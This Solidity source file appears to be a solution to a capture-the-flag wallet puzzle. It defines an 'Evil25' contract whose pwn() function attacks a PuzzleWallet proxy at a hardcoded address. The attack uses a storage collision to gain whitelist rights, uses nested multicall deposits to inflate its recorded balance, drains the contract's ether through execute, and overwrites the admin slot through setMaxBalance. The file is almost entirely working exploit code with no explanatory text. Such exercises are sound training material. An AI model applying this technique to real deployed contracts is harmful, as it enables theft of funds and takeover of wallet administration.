// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./PuzzleWallet.sol";
import "forge-std/console.sol";

interface IPuzzle {
    function proposeNewAdmin(address) external;

    function admin() external view returns (address);

    function owner() external view returns (address);

    function deposit() external payable;

    function addToWhitelist(address) external;

    function multicall(bytes[] calldata data) external payable;

    function approveNewAdmin(address _expectedAdmin) external;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function maxBalance() external view returns (uint256);

    function setMaxBalance(uint256 _maxBalance) external;

    function balances(address) external view returns (uint256);
}

contract Evil25 {
    IPuzzle t = IPuzzle(0xD40d266b4334a3aFA995BD7a05071501e4d7A204);

    function pwn() external {
        t.proposeNewAdmin(address(this));
        t.addToWhitelist(address(this));

        t.deposit{value: 0.001 ether}();

        bytes[] memory data = new bytes[](2);
        bytes[] memory data2 = new bytes[](1);

        data[0] = abi.encodeWithSelector(IPuzzle.deposit.selector);
        data2[0] = abi.encodeWithSelector(IPuzzle.deposit.selector);
        data[1] = abi.encodeWithSelector(IPuzzle.multicall.selector, data2);

        t.multicall{value: 0.001 ether}(data);
        t.execute(address(this), 0.003 ether, "");
        t.setMaxBalance(uint256(uint160(address(this))));
        t.approveNewAdmin(address(this));
    }

    receive() external payable {}
}
